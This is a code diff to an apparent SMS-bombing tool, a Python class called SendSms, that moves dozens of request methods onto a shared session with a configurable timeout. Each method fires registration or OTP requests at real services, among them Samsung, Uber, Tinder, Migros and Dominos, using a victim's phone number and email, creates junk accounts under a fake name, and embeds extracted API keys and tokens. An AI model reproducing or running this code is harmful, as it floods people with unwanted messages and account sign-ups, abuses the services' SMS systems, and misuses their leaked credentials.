+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Samsung(self):
         try:
             url = "https://account.samsung.com/api/v1/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Huawei(self):
         try:
             url = "https://id.huawei.com/api/v1/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Xiaomi(self):
         try:
             url = "https://account.xiaomi.com/api/v1/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Uber(self):
         try:
             url = "https://auth.uber.com/api/v1/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Booking(self):
         try:
             url = "https://www.booking.com/api/v1/users/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Airbnb(self):
         try:
             url = "https://www.airbnb.com/api/v1/users/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Bumble(self):
         try:
             url = "https://bumble.com/api/v1/users/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Tinder(self):
         try:
             url = "https://api.gotinder.com/v1/auth/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Onlyfans(self):
         try:
             url = "https://onlyfans.com/api/v1/users/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Patreon(self):
         try:
             url = "https://www.patreon.com/api/v1/users/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Etsy(self):
         try:
             url = "https://www.etsy.com/api/v1/users/register"
-            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code in [200,201]: self.adet += 1
         except: pass
     def Kigili(self):
         try:
             url = "https://www.kigili.com/users/registration/"
-            r = requests.post(url, data={"first_name":"Memati","last_name":"Bas","email":self.mail,"phone":"0"+self.phone,"password":"nwejkfıower32","confirm":"true","kvkk":"true","next":""}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
+            r = self.session.post(url, data={"first_name":"Memati","last_name":"Bas","email":self.mail,"phone":"0"+self.phone,"password":"nwejkfıower32","confirm":"true","kvkk":"true","next":""}, headers={"User-Agent":"Mozilla/5.0"}, timeout=self.req_timeout)
             if r.status_code == 202: self.adet += 1
         except: pass
     def Bim(self):
         try:
-            r = requests.post("https://bim.veesk.net:443/service/v1.0/account/login", json={"phone":self.phone}, timeout=6)
+            r = self.session.post("https://bim.veesk.net:443/service/v1.0/account/login", json={"phone":self.phone}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Sok(self):
         try:
-            r = requests.post("https://api.ceptesok.com:443/api/users/sendsms", json={"mobile_number":self.phone,"token_type":"register_token"}, timeout=6)
+            r = self.session.post("https://api.ceptesok.com:443/api/users/sendsms", json={"mobile_number":self.phone,"token_type":"register_token"}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Migros(self):
         try:
-            r = requests.post("https://rest.migros.com.tr:443/sanalmarket/users/login/otp", json={"phoneNumber":self.phone}, timeout=6)
+            r = self.session.post("https://rest.migros.com.tr:443/sanalmarket/users/login/otp", json={"phoneNumber":self.phone}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def A101(self):
         try:
-            r = requests.post("https://www.a101.com.tr:443/users/otp-login/", json={"phone":"0"+self.phone,"next":"/a101-kapida"}, timeout=6)
+            r = self.session.post("https://www.a101.com.tr:443/users/otp-login/", json={"phone":"0"+self.phone,"next":"/a101-kapida"}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Sakasu(self):
         try:
-            r = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data={"phone":"0"+self.phone}, timeout=6)
+            r = self.session.post("https://www.sakasu.com.tr:443/app/api_register/step1", data={"phone":"0"+self.phone}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Zarinplus(self):
         try:
-            r = requests.post("https://api.zarinplus.com/user/zarinpal-login", json={"phone_number":"90"+self.phone}, timeout=6)
+            r = self.session.post("https://api.zarinplus.com/user/zarinpal-login", json={"phone_number":"90"+self.phone}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Coregap(self):
         try:
-            r = requests.post(f"https://core.gap.im/v1/user/add.json?mobile=90{self.phone}", timeout=6)
+            r = self.session.post(f"https://core.gap.im/v1/user/add.json?mobile=90{self.phone}", timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Icq(self):
         try:
             url = f"https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90{self.phone}&platform=ios&r=796356153&smsFormatType=human"
-            r = requests.post(url, headers={"User-Agent":"ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4"}, timeout=6)
+            r = self.session.post(url, headers={"User-Agent":"ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4"}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Rentiva(self):
         try:
-            r = requests.post("https://rentiva.com:443/api/Account/Login", json={"phone":self.phone,"type":1}, headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X)"}, timeout=6)
+            r = self.session.post("https://rentiva.com:443/api/Account/Login", json={"phone":self.phone,"type":1}, headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X)"}, timeout=self.req_timeout)
             if r.status_code in [200,201,202]: self.adet += 1
         except: pass
     def Loncamarket(self):
         try:
-            r = requests.post("https://www.loncamarket.com/lid/identity/sendconfirmationcode", json={"Address":self.phone,"ConfirmationType":0}, timeout=6)
+            r = self.session.post("https://www.loncamarket.com/lid/identity/sendconfirmationcode", json={"Address":self.phone,"ConfirmationType":0}, timeout=self.req_timeout)
             if r.status_code in [200,201,202]: self.adet += 1
         except: pass
     def Tazi(self):
         try:
-            r = requests.post("https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin", json={"cep_tel":self.phone,"cep_tel_ulkekod":"90"}, headers={"Authorization":"Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD","Content-Type":"application/json;charset=utf-8"}, timeout=6)
+            r = self.session.post("https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin", json={"cep_tel":self.phone,"cep_tel_ulkekod":"90"}, headers={"Authorization":"Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD","Content-Type":"application/json;charset=utf-8"}, timeout=self.req_timeout)
             if r.status_code in [200,201,202]: self.adet += 1
         except: pass
     def Heyscooter(self):
         try:
             url = f"https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9"
-            r = requests.post(url, timeout=6)
+            r = self.session.post(url, timeout=self.req_timeout)
             if r.status_code in [200,201,202]: self.adet += 1
         except: pass
     def Ipragaz(self):
         try:
-            r = requests.post("https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp",
+            r = self.session.post("https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp",
                 json={"birthDate":"2/7/2000","carPlate":"31 ABC 31","name":"Memati Bas","phoneNumber":self.phone},
-                headers={"Content-Type":"application/json","User-Agent":"ipragaz-mobile/1.3.9"}, timeout=6)
+                headers={"Content-Type":"application/json","User-Agent":"ipragaz-mobile/1.3.9"}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Happy(self):
         try:
-            r = requests.post("https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone",
+            r = self.session.post("https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone",
                 data={"telephone":self.phone},
-                headers={"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"}, timeout=6)
+                headers={"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def KuryemGelsin(self):
         try:
-            r = requests.post("https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/", json={"phoneNumber":self.phone,"phone_country_code":"+90"}, timeout=6)
+            r = self.session.post("https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/", json={"phoneNumber":self.phone,"phone_country_code":"+90"}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Taksim(self):
         try:
-            r = requests.post("https://service.taksim.digital/services/PassengerRegister/Register",
+            r = self.session.post("https://service.taksim.digital/services/PassengerRegister/Register",
                 json={"countryPhoneCode":"+90","name":"Memati","phoneNo":self.phone,"surname":"Bas"},
-                headers={"Content-Type":"application/json; charset=utf-8","Token":"gcAvCfYEp7d//rR5A5vqaFB/Ccej7O+Qz4PRs8LwT4E="}, timeout=6)
+                headers={"Content-Type":"application/json; charset=utf-8","Token":"gcAvCfYEp7d//rR5A5vqaFB/Ccej7O+Qz4PRs8LwT4E="}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def ToptanTeslim(self):
         try:
-            r = requests.post("https://toptanteslim.com:443/Services/V2/MobilServis.aspx",
-                json={"ISLEM":"KayitOl","TELEFON":self.phone,"EPOSTA":self.mail,"KULLANICI_ADI":"Memati","KULLANICI_SOYADI":"Bas","SEHIR":"İSTANBUL","ILCE":"BAŞAKŞEHİR"}, timeout=6)
+            r = self.session.post("https://toptanteslim.com:443/Services/V2/MobilServis.aspx",
+                json={"ISLEM":"KayitOl","TELEFON":self.phone,"EPOSTA":self.mail,"KULLANICI_ADI":"Memati","KULLANICI_SOYADI":"Bas","SEHIR":"İSTANBUL","ILCE":"BAŞAKŞEHİR"}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Starbucks(self):
         try:
-            r = requests.post("https://auth.sbuxtr.com:443/signUp",
-                json={"allowEmail":True,"allowSms":True,"deviceId":"31","email":self.mail,"firstName":"Memati","lastName":"Bas","password":"31ABC..abc31","phoneNumber":self.phone,"preferredName":"Memati"}, timeout=6)
+            r = self.session.post("https://auth.sbuxtr.com:443/signUp",
+                json={"allowEmail":True,"allowSms":True,"deviceId":"31","email":self.mail,"firstName":"Memati","lastName":"Bas","password":"31ABC..abc31","phoneNumber":self.phone,"preferredName":"Memati"}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def BodrumBelediyesi(self):
         try:
-            r = requests.post("https://gandalf.orwi.app:443/api/user/requestOtp",
+            r = self.session.post("https://gandalf.orwi.app:443/api/user/requestOtp",
                 json={"gsm":"+90"+self.phone,"source":"orwi"},
-                headers={"Apikey":"Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE","Content-Type":"application/json"}, timeout=6)
+                headers={"Apikey":"Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE","Content-Type":"application/json"}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Clickme(self):
         try:
-            r = requests.post("https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code",
+            r = self.session.post("https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code",
                 json={"phone":self.phone},
-                headers={"Authorization":"apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc","Content-Type":"application/json"}, timeout=6)
+                headers={"Authorization":"apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc","Content-Type":"application/json"}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def NaosstarsShop(self):
         try:
-            r = requests.post("https://shop.naosstars.com/users/register/",
-                json={"email":self.mail,"first_name":"Memati","last_name":"Bas","password":"nwejkDsOpOJıower32.","date_of_birth":"1975-12-31","phone":"0"+self.phone,"gender":"male","kvkk":"true","contact":"true","confirm":"true"}, timeout=6)
+            r = self.session.post("https://shop.naosstars.com/users/register/",
+                json={"email":self.mail,"first_name":"Memati","last_name":"Bas","password":"nwejkDsOpOJıower32.","date_of_birth":"1975-12-31","phone":"0"+self.phone,"gender":"male","kvkk":"true","contact":"true","confirm":"true"}, timeout=self.req_timeout)
             if r.status_code in [200,201,202]: self.adet += 1
         except: pass
     def Englishhome(self):
         try:
             url = "https://www.englishhome.com:443/api/member/sendOtp"
             headers = {"User-Agent":"Mozilla/5.0","Accept":"*/*","Referer":"https://www.englishhome.com/","Content-Type":"application/json","Origin":"https://www.englishhome.com"}
-            r = requests.post(url, headers=headers, json={"Phone":self.phone,"XID":""}, timeout=10)
+            r = self.session.post(url, headers=headers, json={"Phone":self.phone,"XID":""}, timeout=self.req_timeout)
             if r.json().get("isError") is False:
                 self._ok("Englishhome")
             else:
@@ -5193,15 +5173,15 @@ class SendSms:
 
     def Suiste(self):
         try:
-            r = requests.post("https://suiste.com:443/api/auth/code",
+            r = self.session.post("https://suiste.com:443/api/auth/code",
                 data={"action":"register","device_id":"2390ED28-075E-465A-96DA-DFE8F84EB330","full_name":"Memati Bas","gsm":self.phone,"is_advertisement":"1","is_contract":"1","password":"31MeMaTi31"},
-                headers={"Content-Type":"application/x-www-form-urlencoded; charset=utf-8","User-Agent":"suiste/1.7.11"}, timeout=6)
+                headers={"Content-Type":"application/x-www-form-urlencoded; charset=utf-8","User-Agent":"suiste/1.7.11"}, timeout=self.req_timeout)
             if r.json().get("code") == "common.success": self.adet += 1
         except: pass
     def KimGb(self):
         try:
-            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp",
-                json={"msisdn":f"90{self.phone}"}, timeout=10)
+            r = self.session.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp",
+                json={"msisdn":f"90{self.phone}"}, timeout=self.req_timeout)
             if r.status_code == 200:
                 self._ok("KimGb")
             else:
@@ -5211,47 +5191,47 @@ class SendSms:
 
     def Evidea(self):
         try:
-            r = requests.post("https://www.evidea.com:443/users/register/",
-                data={"first_name":"Memati","last_name":"Bas","email":self.mail,"email_allowed":"false","sms_allowed":"true","password":"31ABC..abc31","phone":"0"+self.phone,"confirm":"true"}, timeout=6)
+            r = self.session.post("https://www.evidea.com:443/users/register/",
+                data={"first_name":"Memati","last_name":"Bas","email":self.mail,"email_allowed":"false","sms_allowed":"true","password":"31ABC..abc31","phone":"0"+self.phone,"confirm":"true"}, timeout=self.req_timeout)
             if r.status_code == 202: self.adet += 1
         except: pass
     def Ucdortbes(self):
         try:
-            r = requests.post("https://api.345dijital.com:443/api/users/register", json={"email":"","name":"Memati","phoneNumber":"+90"+self.phone,"surname":"Bas"}, timeout=6)
+            r = self.session.post("https://api.345dijital.com:443/api/users/register", json={"email":"","name":"Memati","phoneNumber":"+90"+self.phone,"surname":"Bas"}, timeout=self.req_timeout)
             if r.json().get("error") != "E-Posta veya telefon zaten kayıtlı!": self.adet += 1
         except: pass
     def TiklaGelsin(self):
         try:
             query = {"operationName":"GENERATE_OTP","query":"mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\ngenerateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n","variables":{"challenge":"3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68","deviceUniqueId":"720932D5-47BD-46CD-A4B8-086EC49F81AB","phone":"+90"+self.phone}}
-            r = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=query, timeout=6)
+            r = self.session.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=query, timeout=self.req_timeout)
             if r.json().get("data", {}).get("generateOtp") == True: self.adet += 1
         except: pass
     def Naosstars(self):
         try:
-            r = requests.post("https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350", json={"telephone":"+90"+self.phone,"type":"register"}, timeout=6)
+            r = self.session.post("https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350", json={"telephone":"+90"+self.phone,"type":"register"}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Koton(self):
         try:
-            r = requests.post("https://www.koton.com:443/users/register/",
-                data={"first_name":"Memati","last_name":"Bas","email":self.mail,"password":"31ABC..abc31","phone":"0"+self.phone,"confirm":"true","sms_allowed":"true","email_allowed":"true","date_of_birth":"1993-07-02","call_allowed":"true"}, timeout=6)
+            r = self.session.post("https://www.koton.com:443/users/register/",
+                data={"first_name":"Memati","last_name":"Bas","email":self.mail,"password":"31ABC..abc31","phone":"0"+self.phone,"confirm":"true","sms_allowed":"true","email_allowed":"true","date_of_birth":"1993-07-02","call_allowed":"true"}, timeout=self.req_timeout)
             if r.status_code == 202: self.adet += 1
         except: pass
     def Hayatsu(self):
         try:
-            r = requests.post("https://api.hayatsu.com.tr:443/api/SignUp/SendOtp", data={"mobilePhoneNumber":self.phone,"actionType":"register"}, timeout=6)
+            r = self.session.post("https://api.hayatsu.com.tr:443/api/SignUp/SendOtp", data={"mobilePhoneNumber":self.phone,"actionType":"register"}, timeout=self.req_timeout)
             if r.json().get("is_success") == True: self.adet += 1
         except: pass
     def Hizliecza(self):
         try:
-            r = requests.post("https://prod.hizliecza.net:443/mobil/account/sendOTP", json={"otpOperationType":1,"phoneNumber":"+90"+self.phone}, timeout=6)
+            r = self.session.post("https://prod.hizliecza.net:443/mobil/account/sendOTP", json={"otpOperationType":1,"phoneNumber":"+90"+self.phone}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Metro(self):
         try:
             url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
             headers = {"Accept":"*/*","Content-Type":"application/json; charset=utf-8","Applicationversion":"2.4.1","Applicationplatform":"2","User-Agent":"Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1"}
-            r = requests.post(url, headers=headers, json={"methodType":"2","mobilePhoneNumber":self.phone}, timeout=10)
+            r = self.session.post(url, headers=headers, json={"methodType":"2","mobilePhoneNumber":self.phone}, timeout=self.req_timeout)
             if r.json().get("status") == "success":
                 self._ok("Metro")
             else:
@@ -5261,24 +5241,24 @@ class SendSms:
 
     def File(self):
         try:
-            r = requests.post("https://api.filemarket.com.tr:443/v1/otp/send", json={"mobilePhoneNumber":"90"+self.phone}, timeout=6)
+            r = self.session.post("https://api.filemarket.com.tr:443/v1/otp/send", json={"mobilePhoneNumber":"90"+self.phone}, timeout=self.req_timeout)
             if r.json().get("responseType") == "SUCCESS": self.adet += 1
         except: pass
     def Akasya(self):
         try:
-            r = requests.post("https://akasyaapi.poilabs.com:443/v1/en/sms", json={"phone":self.phone}, timeout=6)
+            r = self.session.post("https://akasyaapi.poilabs.com:443/v1/en/sms", json={"phone":self.phone}, timeout=self.req_timeout)
             if r.json().get("result") == "SMS sended succesfully!": self.adet += 1
         except: pass
     def Akbati(self):
         try:
-            r = requests.post("https://akbatiapi.poilabs.com:443/v1/en/sms", json={"phone":self.phone}, timeout=6)
+            r = self.session.post("https://akbatiapi.poilabs.com:443/v1/en/sms", json={"phone":self.phone}, timeout=self.req_timeout)
             if r.json().get("result") == "SMS sended succesfully!": self.adet += 1
         except: pass
     def Komagene(self):
         try:
             url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
             headers = {"User-Agent":"Mozilla/5.0","Accept":"*/*","Referer":"https://www.komagene.com.tr/","Anonymousclientid":"0dbf392b-ab10-48b3-5cda-31f3c19816e6","Firmaid":"32","Content-Type":"application/json","Origin":"https://www.komagene.com.tr"}
-            r = requests.post(url, headers=headers, json={"FirmaId":32,"Telefon":self.phone}, timeout=10)
+            r = self.session.post(url, headers=headers, json={"FirmaId":32,"Telefon":self.phone}, timeout=self.req_timeout)
             if r.json().get("Success") is True:
                 self._ok("Komagene")
             else:
@@ -5288,26 +5268,26 @@ class SendSms:
 
     def Porty(self):
         try:
-            r = requests.post("https://panel.porty.tech:443/api.php?",
+            r = self.session.post("https://panel.porty.tech:443/api.php?",
                 json={"job":"start_login","phone":self.phone},
-                headers={"Token":"q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ","Content-Type":"application/json; charset=UTF-8"}, timeout=6)
+                headers={"Token":"q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ","Content-Type":"application/json; charset=UTF-8"}, timeout=self.req_timeout)
             if r.json().get("status") == "success": self.adet += 1
         except: pass
     def Tasdelen(self):
         try:
-            r = requests.post("https://tasdelen.sufirmam.com:3300/mobile/send-otp", json={"phone":self.phone}, timeout=6)
+            r = self.session.post("https://tasdelen.sufirmam.com:3300/mobile/send-otp", json={"phone":self.phone}, timeout=self.req_timeout)
             if r.json().get("result") == True: self.adet += 1
         except: pass
     def Uysal(self):
         try:
-            r = requests.post("https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms", json={"phone_number":self.phone}, timeout=6)
+            r = self.session.post("https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms", json={"phone_number":self.phone}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Yapp(self):
         try:
             url = "https://yapp.com.tr:443/api/mobile/v1/register"
             headers = {"Accept":"application/json","Content-Type":"application/json","X-Content-Language":"en","User-Agent":"YappApp/1.1.5 (iPhone; iOS 15.8.3; Scale/3.00)"}
-            r = requests.post(url, headers=headers, json={"app_version":"1.1.5","code":"tr","device_model":"iPhone8,5","device_name":"Memati","device_type":"I","device_version":"15.8.3","email":self.mail,"firstname":"Memati","is_allow_to_communication":"1","language_id":"2","lastname":"Bas","phone_number":self.phone,"sms_code":""}, timeout=10)
+            r = self.session.post(url, headers=headers, json={"app_version":"1.1.5","code":"tr","device_model":"iPhone8,5","device_name":"Memati","device_type":"I","device_version":"15.8.3","email":self.mail,"firstname":"Memati","is_allow_to_communication":"1","language_id":"2","lastname":"Bas","phone_number":self.phone,"sms_code":""}, timeout=self.req_timeout)
             if r.status_code == 200:
                 self._ok("Yapp")
             else:
@@ -5318,23 +5298,23 @@ class SendSms:
     def YilmazTicaret(self):
         try:
             formatted = f"0 ({self.phone[:3]}) {self.phone[3:6]} {self.phone[6:8]} {self.phone[8:]}"
-            r = requests.post("https://app.buyursungelsin.com:443/api/customer/form/checkx",
-                data={"fonksiyon":"customer/form/checkx","method":"POST","telephone":formatted,"token":"d7841d399a16d0060d3b8a76bf70542e"}, timeout=6)
+            r = self.session.post("https://app.buyursungelsin.com:443/api/customer/form/checkx",
+                data={"fonksiyon":"customer/form/checkx","method":"POST","telephone":formatted,"token":"d7841d399a16d0060d3b8a76bf70542e"}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Beefull(self):
         try:
-            requests.post("https://app.beefull.io:443/api/inavitas-access-management/signup",
-                json={"email":self.mail,"firstName":"Memati","language":"tr","lastName":"Bas","password":"123456","phoneCode":"90","phoneNumber":self.phone,"tenant":"beefull","username":self.mail}, timeout=4)
-            r = requests.post("https://app.beefull.io:443/api/inavitas-access-management/sms-login",
-                json={"phoneCode":"90","phoneNumber":self.phone,"tenant":"beefull"}, timeout=4)
+            self.session.post("https://app.beefull.io:443/api/inavitas-access-management/signup",
+                json={"email":self.mail,"firstName":"Memati","language":"tr","lastName":"Bas","password":"123456","phoneCode":"90","phoneNumber":self.phone,"tenant":"beefull","username":self.mail}, timeout=self.req_timeout)
+            r = self.session.post("https://app.beefull.io:443/api/inavitas-access-management/sms-login",
+                json={"phoneCode":"90","phoneNumber":self.phone,"tenant":"beefull"}, timeout=self.req_timeout)
             if r.status_code == 200: self.adet += 1
         except: pass
     def Dominos(self):
         try:
             url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
             headers = {"Content-Type":"application/json;charset=utf-8","Accept":"application/json, text/plain, */*","Appversion":"IOS-7.1.0","User-Agent":"Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0","Servicetype":"CarryOut"}
-            r = requests.post(url, headers=headers, json={"email":self.mail,"isSure":False,"mobilePhone":self.phone}, timeout=10)
+            r = self.session.post(url, headers=headers, json={"email":self.mail,"isSure":False,"mobilePhone":self.phone}, timeout=self.req_timeout)
             if r.json().get("isSuccess") is True:
                 self._ok("Dominos")
             else:
@@ -5344,33 +5324,33 @@ class SendSms:
 
     def Baydoner(self):
         try:
-            r = requests.post("https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp",
-                json={"AppVersion":"1.6.0","AreaCode":90,"City":"ADANA","CityId":1,"Email":self.mail,"Name":"Memati","PhoneNumber":self.phone,"Surname":"Bas","Password":"31ABC..abc31"}, timeout=6)
+            r = self.session.post("https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp",
+                json={"AppVersion":"1.6.0","AreaCode":90,"City":"ADANA","CityId":1,"Email":self.mail,"Name":"Memati","PhoneNumber":self.phone,"Surname":"Bas","Password":"31ABC..abc31"}, timeout=self.req_timeout)
             if r.json().get("Control") == 1: self.adet += 1
         except: pass
     def Pidem(self):
         try:
-            r = requests.post("https://restashop.azurewebsites.net:443/graphql/",
-                json={"query":"\nmutation ($phone: String) {\nsendOtpSms(phone: $phone) {\nresultStatus\nmessage\n}\n}\n","variables":{"phone":self.phone}}, timeout=6)
+            r = self.session.post("https://restashop.azurewebsites.net:443/graphql/",
+                json={"query":"\nmutation ($phone: String) {\nsendOtpSms(phone: $phone) {\nresultStatus\nmessage\n}\n}\n","variables":{"phone":self.phone}}, timeout=self.req_timeout)
             if r.json().get("data", {}).get("sendOtpSms", {}).get("resultStatus") == "SUCCESS": self.adet += 1
         except: pass
     def Frink(self):
         try:
